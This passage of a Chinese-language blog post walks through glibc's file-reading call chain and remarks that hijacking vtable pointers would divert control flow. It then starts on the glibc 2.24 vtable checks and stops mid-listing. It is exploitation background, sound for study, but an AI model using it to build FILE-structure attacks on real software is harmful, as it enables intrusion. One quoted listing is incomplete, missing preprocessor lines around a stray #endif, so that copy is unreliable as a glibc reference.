<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><code class="hljs c">_IO_size_t<br>_IO_file_xsgetn (_IO_FILE *fp, <span class="hljs-type">void</span> *data, _IO_size_t n)<br>&#123;<br>  _IO_size_t want, have;<br>  _IO_ssize_t count;<br>  <span class="hljs-type">char</span> *s = data;<br><br>  want = n;<br><br>  <span class="hljs-keyword">if</span> (fp-&gt;_IO_buf_base == <span class="hljs-literal">NULL</span>)<br>    &#123;<br>      <span class="hljs-comment">/* Maybe we already have a push back pointer.  */</span><br>      <span class="hljs-keyword">if</span> (fp-&gt;_IO_save_base != <span class="hljs-literal">NULL</span>)<br>    &#123;<br>      <span class="hljs-built_in">free</span> (fp-&gt;_IO_save_base);<br>      fp-&gt;_flags &amp;= ~_IO_IN_BACKUP;<br>    &#125;<br>      _IO_doallocbuf (fp);<br>    &#125;<br><br>  <span class="hljs-keyword">while</span> (want &gt; <span class="hljs-number">0</span>)<br>    &#123;<br>      have = fp-&gt;_IO_read_end - fp-&gt;_IO_read_ptr;<br>      <span class="hljs-keyword">if</span> (want &lt;= have)<br>    &#123;<br>      <span class="hljs-built_in">memcpy</span> (s, fp-&gt;_IO_read_ptr, want);<br>      fp-&gt;_IO_read_ptr += want;<br>      want = <span class="hljs-number">0</span>;<br>    &#125;<br>      <span class="hljs-keyword">else</span><br>    &#123;<br>      <span class="hljs-keyword">if</span> (have &gt; <span class="hljs-number">0</span>)<br>        &#123;<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> _LIBC</span><br>          s = __mempcpy (s, fp-&gt;_IO_read_ptr, have);<br><span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br>          <span class="hljs-built_in">memcpy</span> (s, fp-&gt;_IO_read_ptr, have);<br>          s += have;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>          want -= have;<br>          fp-&gt;_IO_read_ptr += have;<br>        &#125;<br><br>      <span class="hljs-comment">/* Check for backup and repeat */</span><br>      <span class="hljs-keyword">if</span> (_IO_in_backup (fp))<br>        &#123;<br>          _IO_switch_to_main_get_area (fp);<br>          <span class="hljs-keyword">continue</span>;<br>        &#125;<br><br>      <span class="hljs-comment">/* If we now want less than a buffer, underflow and repeat</span><br><span class="hljs-comment">         the copy.  Otherwise, _IO_SYSREAD directly to</span><br><span class="hljs-comment">         the user buffer. */</span><br>      <span class="hljs-keyword">if</span> (fp-&gt;_IO_buf_base<br>          &amp;&amp; want &lt; (<span class="hljs-type">size_t</span>) (fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base))<br>        &#123;<br>          <span class="hljs-keyword">if</span> (__underflow (fp) == EOF)<br>        <span class="hljs-keyword">break</span>;<br><br>          <span class="hljs-keyword">continue</span>;<br>        &#125;<br><br>      <span class="hljs-comment">/* These must be set before the sysread as we might longjmp out</span><br><span class="hljs-comment">         waiting for input. */</span><br>      _IO_setg (fp, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base);<br>      _IO_setp (fp, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base);<br><br>      <span class="hljs-comment">/* Try to maintain alignment: read a whole number of blocks.  */</span><br>      count = want;<br>      <span class="hljs-keyword">if</span> (fp-&gt;_IO_buf_base)<br>        &#123;<br>          _IO_size_t block_size = fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base;<br>          <span class="hljs-keyword">if</span> (block_size &gt;= <span class="hljs-number">128</span>)<br>        count -= want % block_size;<br>        &#125;<br><br>      count = _IO_SYSREAD (fp, s, count);<br>      <span class="hljs-keyword">if</span> (count &lt;= <span class="hljs-number">0</span>)<br>        &#123;<br>          <span class="hljs-keyword">if</span> (count == <span class="hljs-number">0</span>)<br>        fp-&gt;_flags |= _IO_EOF_SEEN;<br>          <span class="hljs-keyword">else</span><br>        fp-&gt;_flags |= _IO_ERR_SEEN;<br><br>          <span class="hljs-keyword">break</span>;<br>        &#125;<br><br>      s += count;<br>      want -= count;<br>      <span class="hljs-keyword">if</span> (fp-&gt;_offset != _IO_pos_BAD)<br>        _IO_pos_adjust (fp-&gt;_offset, count);<br>    &#125;<br>    &#125;<br><br>  <span class="hljs-keyword">return</span> n - want;<br>&#125;<br>libc_hidden_def (_IO_file_xsgetn)<br></code></pre></td></tr></table></figure>

<p>通过如下判断确定缓冲区是否开辟：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (fp-&gt;_IO_buf_base == <span class="hljs-literal">NULL</span>)<br></code></pre></td></tr></table></figure>

<p>如果没有开辟则主动开辟：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span><br>_IO_file_doallocate (_IO_FILE *fp)<br>&#123;<br>  _IO_size_t size;<br>  <span class="hljs-type">char</span> *p;<br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">stat64</span> <span class="hljs-title">st</span>;</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> _LIBC</span><br>  <span class="hljs-comment">/* If _IO_cleanup_registration_needed is non-zero, we should call the</span><br><span class="hljs-comment">     function it points to.  This is to make sure _IO_cleanup gets called</span><br><span class="hljs-comment">     on exit.  We call it from _IO_file_doallocate, since that is likely</span><br><span class="hljs-comment">     to get called by any program that does buffered I/O. */</span><br>  <span class="hljs-keyword">if</span> (__glibc_unlikely (_IO_cleanup_registration_needed != <span class="hljs-literal">NULL</span>))<br>    (*_IO_cleanup_registration_needed) ();<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br>  size = _IO_BUFSIZ;<br>  <span class="hljs-keyword">if</span> (fp-&gt;_fileno &gt;= <span class="hljs-number">0</span> &amp;&amp; __builtin_expect (_IO_SYSSTAT (fp, &amp;st), <span class="hljs-number">0</span>) &gt;= <span class="hljs-number">0</span>)<br>    &#123;<br>      <span class="hljs-keyword">if</span> (S_ISCHR (st.st_mode))<br>    &#123;<br>      <span class="hljs-comment">/* Possibly a tty.  */</span><br>      <span class="hljs-keyword">if</span> (<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> DEV_TTY_P</span><br>          DEV_TTY_P (&amp;st) ||<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>          local_isatty (fp-&gt;_fileno))<br>        fp-&gt;_flags |= _IO_LINE_BUF;<br>    &#125;<br><span class="hljs-meta">#<span class="hljs-keyword">if</span> _IO_HAVE_ST_BLKSIZE</span><br>      <span class="hljs-keyword">if</span> (st.st_blksize &gt; <span class="hljs-number">0</span>)<br>    size = st.st_blksize;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>    &#125;<br>  p = <span class="hljs-built_in">malloc</span> (size);<br>  <span class="hljs-keyword">if</span> (__glibc_unlikely (p == <span class="hljs-literal">NULL</span>))<br>    <span class="hljs-keyword">return</span> EOF;<br>  _IO_setb (fp, p, p + size, <span class="hljs-number">1</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>&#125;<br>libc_hidden_def (_IO_file_doallocate)<br></code></pre></td></tr></table></figure>

<p>缓冲区在此处通过堆内存来开辟：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">p = <span class="hljs-built_in">malloc</span> (size);<br></code></pre></td></tr></table></figure>

<p>然后最终再将其设置为缓冲区：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span><br>_IO_setb (_IO_FILE *f, <span class="hljs-type">char</span> *b, <span class="hljs-type">char</span> *eb, <span class="hljs-type">int</span> a)<br>&#123;<br>  <span class="hljs-keyword">if</span> (f-&gt;_IO_buf_base &amp;&amp; !(f-&gt;_flags &amp; _IO_USER_BUF))<br>    <span class="hljs-built_in">free</span> (f-&gt;_IO_buf_base);<br>  f-&gt;_IO_buf_base = b;<br>  f-&gt;_IO_buf_end = eb;<br>  <span class="hljs-keyword">if</span> (a)<br>    f-&gt;_flags &amp;= ~_IO_USER_BUF;<br>  <span class="hljs-keyword">else</span><br>    f-&gt;_flags |= _IO_USER_BUF;<br>&#125;<br>libc_hidden_def (_IO_setb)<br></code></pre></td></tr></table></figure>

<p>在完成开辟以后尝试读取：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">while</span> (want &gt; <span class="hljs-number">0</span>)<br>  &#123;<br>    have = fp-&gt;_IO_read_end - fp-&gt;_IO_read_ptr;<br>    <span class="hljs-keyword">if</span> (want &lt;= have)<br>  &#123;<br>    <span class="hljs-built_in">memcpy</span> (s, fp-&gt;_IO_read_ptr, want);<br>    fp-&gt;_IO_read_ptr += want;<br>    want = <span class="hljs-number">0</span>;<br>  &#125;<br></code></pre></td></tr></table></figure>

<p>如果缓冲区中的余量尚且足够，那就可以直接将这部分数据拷贝到用户缓冲区；</p>
<p>但如果不够，则需要进一步的处理：</p>
<p>首先，如果缓冲区中还有数据，那就先把缓冲区中的所有内容写进用户缓冲区。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c">      <span class="hljs-keyword">else</span><br>    &#123;<br>      <span class="hljs-keyword">if</span> (have &gt; <span class="hljs-number">0</span>)<br>        &#123;<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> _LIBC</span><br>          s = __mempcpy (s, fp-&gt;_IO_read_ptr, have);<br><span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br>          <span class="hljs-built_in">memcpy</span> (s, fp-&gt;_IO_read_ptr, have);<br>          s += have;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>          want -= have;<br>          fp-&gt;_IO_read_ptr += have;<br>        &#125;<br></code></pre></td></tr></table></figure>

<p>接下来需要调用 <code>__underflow</code> 来获取新数据：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Check for backup and repeat */</span><br><span class="hljs-keyword">if</span> (_IO_in_backup (fp))<br>  &#123;<br>    _IO_switch_to_main_get_area (fp);<br>    <span class="hljs-keyword">continue</span>;<br>  &#125;<br><br><span class="hljs-comment">/* If we now want less than a buffer, underflow and repeat</span><br><span class="hljs-comment">   the copy.  Otherwise, _IO_SYSREAD directly to</span><br><span class="hljs-comment">   the user buffer. */</span><br><span class="hljs-keyword">if</span> (fp-&gt;_IO_buf_base<br>    &amp;&amp; want &lt; (<span class="hljs-type">size_t</span>) (fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base))<br>  &#123;<br>    <span class="hljs-keyword">if</span> (__underflow (fp) == EOF)<br>  <span class="hljs-keyword">break</span>;<br><br>    <span class="hljs-keyword">continue</span>;<br>  &#125;<br></code></pre></td></tr></table></figure>

<p>跟入进去可以找到对应的定义：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span><br>__underflow (_IO_FILE *fp)<br>&#123;<br><span class="hljs-meta">#<span class="hljs-keyword">if</span> defined _LIBC || defined _GLIBCPP_USE_WCHAR_T</span><br>  <span class="hljs-keyword">if</span> (_IO_vtable_offset (fp) == <span class="hljs-number">0</span> &amp;&amp; _IO_fwide (fp, <span class="hljs-number">-1</span>) != <span class="hljs-number">-1</span>)<br>    <span class="hljs-keyword">return</span> EOF;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br>  <span class="hljs-keyword">if</span> (fp-&gt;_mode == <span class="hljs-number">0</span>)<br>    _IO_fwide (fp, <span class="hljs-number">-1</span>);<br>  <span class="hljs-keyword">if</span> (_IO_in_put_mode (fp))<br>    <span class="hljs-keyword">if</span> (_IO_switch_to_get_mode (fp) == EOF)<br>      <span class="hljs-keyword">return</span> EOF;<br>  <span class="hljs-keyword">if</span> (fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end)<br>    <span class="hljs-keyword">return</span> *(<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *) fp-&gt;_IO_read_ptr;<br>  <span class="hljs-keyword">if</span> (_IO_in_backup (fp))<br>    &#123;<br>      _IO_switch_to_main_get_area (fp);<br>      <span class="hljs-keyword">if</span> (fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end)<br>    <span class="hljs-keyword">return</span> *(<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *) fp-&gt;_IO_read_ptr;<br>    &#125;<br>  <span class="hljs-keyword">if</span> (_IO_have_markers (fp))<br>    &#123;<br>      <span class="hljs-keyword">if</span> (save_for_backup (fp, fp-&gt;_IO_read_end))<br>    <span class="hljs-keyword">return</span> EOF;<br>    &#125;<br>  <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (_IO_have_backup (fp))<br>    _IO_free_backup_area (fp);<br>  <span class="hljs-keyword">return</span> _IO_UNDERFLOW (fp);<br>&#125;<br>libc_hidden_def (__underflow)<br></code></pre></td></tr></table></figure>

<p>这整个函数做了很多检查，但最终是需要调用 <code>_IO_UNDERFLOW</code> 完成主要功能的，该函数也在 vtable 中：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span><br>_IO_new_file_underflow (_IO_FILE *fp)<br>&#123;<br>  _IO_ssize_t count;<br><br>  <span class="hljs-keyword">if</span> (fp-&gt;_flags &amp; _IO_NO_READS)<br>    &#123;<br>      fp-&gt;_flags |= _IO_ERR_SEEN;<br>      __set_errno (EBADF);<br>      <span class="hljs-keyword">return</span> EOF;<br>    &#125;<br>  <span class="hljs-keyword">if</span> (fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end)<br>    <span class="hljs-keyword">return</span> *(<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *) fp-&gt;_IO_read_ptr;<br><br>  <span class="hljs-keyword">if</span> (fp-&gt;_IO_buf_base == <span class="hljs-literal">NULL</span>)<br>    &#123;<br>      <span class="hljs-comment">/* Maybe we already have a push back pointer.  */</span><br>      <span class="hljs-keyword">if</span> (fp-&gt;_IO_save_base != <span class="hljs-literal">NULL</span>)<br>        &#123;<br>          <span class="hljs-built_in">free</span> (fp-&gt;_IO_save_base);<br>          fp-&gt;_flags &amp;= ~_IO_IN_BACKUP;<br>        &#125;<br>      _IO_doallocbuf (fp);<br>    &#125;<br>      _IO_acquire_lock (_IO_stdout);<br><br>      <span class="hljs-keyword">if</span> ((_IO_stdout-&gt;_flags &amp; (_IO_LINKED | _IO_NO_WRITES | _IO_LINE_BUF))<br>  == (_IO_LINKED | _IO_LINE_BUF))<br>_IO_OVERFLOW (_IO_stdout, EOF);<br><br>      _IO_release_lock (_IO_stdout);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>    &#125;<br><br>  _IO_switch_to_get_mode (fp);<br><br>  fp-&gt;_IO_read_base = fp-&gt;_IO_read_ptr = fp-&gt;_IO_buf_base;<br>  fp-&gt;_IO_read_end = fp-&gt;_IO_buf_base;<br>  fp-&gt;_IO_write_base = fp-&gt;_IO_write_ptr = fp-&gt;_IO_write_end<br>    = fp-&gt;_IO_buf_base;<br><br>  count = _IO_SYSREAD (fp, fp-&gt;_IO_buf_base,<br>       fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base);<br>  <span class="hljs-keyword">if</span> (count &lt;= <span class="hljs-number">0</span>)<br>    &#123;<br>      <span class="hljs-keyword">if</span> (count == <span class="hljs-number">0</span>)<br>        fp-&gt;_flags |= _IO_EOF_SEEN;<br>              <span class="hljs-keyword">else</span><br>        fp-&gt;_flags |= _IO_ERR_SEEN, count = <span class="hljs-number">0</span>;<br>  &#125;<br>  fp-&gt;_IO_read_end += count;<br>  <span class="hljs-keyword">if</span> (count == <span class="hljs-number">0</span>)<br>    &#123;<br>      fp-&gt;_offset = _IO_pos_BAD;<br>      <span class="hljs-keyword">return</span> EOF;<br>    &#125;<br>  <span class="hljs-keyword">if</span> (fp-&gt;_offset != _IO_pos_BAD)<br>    _IO_pos_adjust (fp-&gt;_offset, count);<br>  <span class="hljs-keyword">return</span> *(<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *) fp-&gt;_IO_read_ptr;<br>&#125;<br>libc_hidden_ver (_IO_new_file_underflow, _IO_file_underflow)<br></code></pre></td></tr></table></figure>

<p>代码并不复杂，简单来说就做这么一件事：</p>
<blockquote>
<p>首先经过 flag 的检查之后，如果缓冲区未建立，则用 _IO_doallocbuf 创建缓冲区；<br>接下来，设定读取和写入的指针界限；<br>再然后通过 _IO_SYSREAD ，该函数通过系统调用从硬盘读取数据到缓冲区；<br>读取以后，设定缓冲区的读取边界</p>
</blockquote>
<blockquote>
<p>_IO_new_file_underflow 的应用比较广，很多文件读写最终都会向该函数发起调用<br>并且，有些函数并不经过 _IO_doallocbuf ，因此在 _IO_new_file_underflow 中会有一次判断和开辟的过程。</p>
</blockquote>
<p>最后，在完成调用以后，会通过 continue 返回到 while 重新进行判断，由于其这次将缓冲区初始化，因此可以通过 memcpy 将数据复制到用户缓冲区：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs c">  <span class="hljs-keyword">while</span> (want &gt; <span class="hljs-number">0</span>)<br>    &#123;<br>      have = fp-&gt;_IO_read_end - fp-&gt;_IO_read_ptr;<br>      <span class="hljs-keyword">if</span> (want &lt;= have)<br>    &#123;<br>      <span class="hljs-built_in">memcpy</span> (s, fp-&gt;_IO_read_ptr, want);<br>      fp-&gt;_IO_read_ptr += want;<br>      want = <span class="hljs-number">0</span>;<br>    &#125;<br>      <span class="hljs-keyword">else</span><br>    &#123;<br>      <span class="hljs-keyword">if</span> (have &gt; <span class="hljs-number">0</span>)<br>        &#123;<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> _LIBC</span><br>          s = __mempcpy (s, fp-&gt;_IO_read_ptr, have);<br><span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br>          <span class="hljs-built_in">memcpy</span> (s, fp-&gt;_IO_read_ptr, have);<br>          s += have;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>          want -= have;<br>          fp-&gt;_IO_read_ptr += have;<br>        &#125;<br><br>      <span class="hljs-comment">/* Check for backup and repeat */</span><br>      <span class="hljs-keyword">if</span> (_IO_in_backup (fp))<br>        &#123;<br>          _IO_switch_to_main_get_area (fp);<br>          <span class="hljs-keyword">continue</span>;<br>        &#125;<br><br>      <span class="hljs-keyword">if</span> (fp-&gt;_IO_buf_base<br>          &amp;&amp; want &lt; (<span class="hljs-type">size_t</span>) (fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base))<br>        &#123;<br>          <span class="hljs-keyword">if</span> (__underflow (fp) == EOF)<br>        <span class="hljs-keyword">break</span>;<br><br>          <span class="hljs-keyword">continue</span>;<br>        &#125;<br></code></pre></td></tr></table></figure>

<p>这一套调用链梳理以后，对 文件结构是文件在内存中的抽象 这一概念或许就有些概念了。</p>
<p>如您所见，上述的调用链多次使用虚表进行跳转，因此如果能够劫持虚表中的函数地址，即可在调用对应函数时劫持控制流。</p>
<h1 id="2-24-调整与保护"><a href="#2-24-调整与保护" class="headerlink" title="2.24 调整与保护"></a>2.24 调整与保护</h1><p>在上文中介绍了劫持虚表以及文件结构的调用逻辑。但劫持整个虚表的操作在 GLIBC2.24 开始就被检查了。</p>
<p>后来添加的 <code>IO_validate_vtable</code> 和 <code>IO_vtable_check</code> 用于检查 vtable 的合法性：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> _IO_jump_t *<br><span class="hljs-title function_">IO_validate_vtable</span> <span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> _IO_jump_t *vtable)</span><br>&#123;<br>  <span class="hljs-type">uintptr_t</span> section_length = __stop___libc_IO_vtables - __start___libc_IO_vtables;<br>  <span class="hljs-type">const</span> <span class="hljs-type">char</span> *ptr = (<span class="hljs-type">const</span> <span class="hljs-type">char</span> *) vtable;<br>  <span class="hljs-type">uintptr_t</span> offset = ptr - __start___libc_IO_vtables;<br>  <span class="hljs-keyword">if</span> (__glibc_unlikely (offset &gt;= section_length))<br>    _IO_vtable_check ();<br>  <span class="hljs-keyword">return</span> vtable;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>进入检查的前提条件是：虚表对应的偏移大于虚表节区的长度。</p>
<p>GLIBC 维护了多张虚表，但这些虚表均处于一段较为固定的内存，因此该判断触发条件是，虚表不位于该内存段处。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> attribute_hidden<br>_IO_vtable_check (<span class="hljs-type">void</span>)<br>&#123;<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> SHARED</span><br>  <span class="hljs-comment">/* Honor the compatibility flag.  */</span><br>  <span class="hljs-type">void</span> (*flag) (<span class="hljs-type">void</span>) = atomic_load_relaxed (&amp;IO_accept_foreign_vtables);<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> PTR_DEMANGLE</span><br>  PTR_DEMANGLE (flag);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>  <span class="hljs-keyword">if</span> (flag == &amp;_IO_vtable_check)<br>    <span class="hljs-keyword">return</span>;<br><br>  <span class="hljs-comment">/* In case this libc copy is in a non-default namespace, we always</span><br><span 